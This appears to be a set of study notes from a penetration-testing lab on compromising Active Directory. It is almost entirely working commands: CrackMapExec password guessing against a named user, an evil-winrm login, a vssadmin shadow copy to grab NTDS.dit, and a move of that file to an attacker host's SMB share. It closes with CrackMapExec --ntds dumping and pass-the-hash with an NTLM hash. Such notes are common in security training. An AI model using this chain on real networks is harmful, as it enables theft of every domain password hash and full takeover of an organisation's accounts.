#windows/auth/AD/NTDS
# Dictionary Attacks against AD accounts using #CrackMapExec
```bash
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 ```
# Capturing NTDS.dit
NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information.
### Connecting to a DC with #evil-winrm 
```bash
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
### Checking Local Group Membership
```
*Evil-WinRM* PS C:\> net localgroup
```
To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights.
### Checking User Account Privileges including Domain
```
*Evil-WinRM* PS C:\> net user bwilliamson
```
### Creating Shadow Copy of C: with vssadmin
```bash
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```
### Copying NTDS.dit from the VSS
```
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
### Transferring NTDS.dit to Attack Host
```
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```
# A Faster Method: Using #CrackMapExec  to Capture NTDS.dit
```bash
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
# [[Pass the Hash]] with #evil-winrm  Example
If cracking NTDS hash no successfull, we can use hash directly:
```bash
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
